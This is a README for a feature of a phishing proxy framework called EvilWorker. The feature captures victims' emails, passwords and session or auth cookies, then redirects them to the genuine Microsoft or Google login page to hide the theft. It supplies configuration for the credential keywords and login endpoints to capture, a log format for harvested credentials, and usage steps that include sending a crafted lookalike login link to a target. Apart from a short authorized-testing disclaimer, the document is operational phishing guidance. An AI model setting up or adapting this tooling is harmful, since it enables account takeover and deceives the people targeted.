# 🔐 EvilWorker Credential Redirect Feature

This feature automatically redirects users to the legitimate service after collecting their credentials (email and password), making the phishing attack more seamless and less detectable.

## 🚀 How It Works

1. **Credential Detection**: The framework monitors for:
   - Login form submissions with email/password fields
   - Credential-related cookies (auth, token, session, etc.)
   - Login endpoint requests

2. **Automatic Redirect**: Once credentials are detected, the user is automatically redirected to the legitimate service

3. **Seamless Experience**: The victim gets redirected to the real login page, making the attack appear legitimate

## ⚙️ Configuration

### Environment Variables

```bash
# Enable/disable credential redirect (default: true)
ENABLE_CREDENTIAL_REDIRECT=true

# URL to redirect to after collecting credentials
CREDENTIALS_REDIRECT_URL=https://login.microsoftonline.com/
```

### Configuration File (`config.js`)

```javascript
module.exports = {
    credentials: {
        // Enable/disable automatic redirect
        enableRedirect: true,
        
        // Redirect URL
        redirectUrl: "https://login.microsoftonline.com/",
        
        // Keywords to detect credential cookies
        credentialKeywords: [
            'email', 'password', 'credential', 'auth', 'token', 
            'session', 'login', 'username', 'user', 'pass'
        ],
        
        // Login endpoints to monitor
        loginEndpoints: [
            '/login', '/signin', '/auth', '/authenticate', '/signon',
            '/common/login', '/common/signin', '/oauth2/authorize'
        ],
        
        // Form fields that indicate credentials
        credentialFields: [
            'email', 'password', 'username', 'user', 'pass', 'pwd',
            'login', 'signin', 'auth', 'credential'
        ]
    }
};
```

## 📊 Logging

When credentials are collected and redirect occurs, the framework logs:

```json
{
    "timestamp": "2025-01-14T10:47:06.359Z",
    "session": "abc123def456",
    "event": "CREDENTIALS_COLLECTED",
    "redirectUrl": "https://login.microsoftonline.com/",
    "cookies": [...],
    "lastRequestBody": "..."
}
```

## 🔧 Customization Examples

### Redirect to Different Service

```javascript
// config.js
module.exports = {
    credentials: {
        redirectUrl: "https://accounts.google.com/signin",
        // ... other settings
    }
};
```

### Disable Redirect

```javascript
// config.js
module.exports = {
    credentials: {
        enableRedirect: false,
        // ... other settings
    }
};
```

### Custom Credential Detection

```javascript
// config.js
module.exports = {
    credentials: {
        credentialKeywords: [
            'email', 'password', 'credential', 'auth', 'token', 
            'session', 'login', 'username', 'user', 'pass',
            'myapp_auth', 'custom_token'  // Add custom keywords
        ],
        credentialFields: [
            'email', 'password', 'username', 'user', 'pass', 'pwd',
            'login', 'signin', 'auth', 'credential',
            'myapp_user', 'myapp_pass'  // Add custom fields
        ]
    }
};
```

## 🛡️ Security Features

- **Encrypted Logging**: All credential events are encrypted before logging
- **Session Isolation**: Each victim session is tracked separately
- **Cache Prevention**: Redirect headers prevent browser caching
- **Configurable Detection**: Adjustable sensitivity for credential detection

## 📝 Usage Example

1. **Start the server**:
   ```bash
   node proxy_server.js
   ```

2. **Send phishing link** to target:
   ```
   https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
   ```

3. **Monitor logs** for credential collection events:
   ```bash
   tail -f phishing_logs/*.log
   ```

## ⚠️ Important Notes

- **Legal Use Only**: This tool is for authorized security testing only
- **Ethical Considerations**: Always obtain proper authorization before testing
- **Data Protection**: Ensure collected data is handled securely and deleted after testing
- **Compliance**: Follow local laws and regulations regarding security testing

## 🔍 Troubleshooting

### Redirect Not Working

1. Check if `enableRedirect` is set to `true` in config
2. Verify the `redirectUrl` is accessible
3. Check console logs for credential detection messages
4. Ensure login endpoints are correctly configured

### False Positives

1. Adjust `credentialKeywords` to be more specific
2. Modify `credentialFields` to match your target service
3. Update `loginEndpoints` to match the actual login URLs

### Logging Issues

1. Verify `enableCredentialLogging` is enabled
2. Check file permissions for log directory
3. Ensure encryption key is properly set
